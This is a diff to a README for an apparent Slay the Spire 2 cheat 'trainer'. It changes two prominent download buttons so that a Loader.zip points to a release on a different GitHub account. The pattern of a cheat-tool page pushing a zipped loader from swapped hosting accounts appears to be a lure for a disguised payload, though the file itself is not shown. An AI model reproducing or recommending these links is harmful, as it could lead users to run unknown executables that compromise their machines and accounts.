@@ -41,7 +41,7 @@ But Slay the Spire 2 is **brutal**. The **RNG** can end runs instantly. The **As
 
 ## 🔗 Download
 
-[![Download Slay the Spire 2 Trainer 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=2E7D32)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Slay the Spire 2 Trainer 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=2E7D32)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
@@ -235,7 +235,7 @@ The trainer ships with a full-featured config system — every setting, keybind,
 
 ## 📥 Download Slay the Spire 2 Trainer 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=2E7D32)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=2E7D32)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
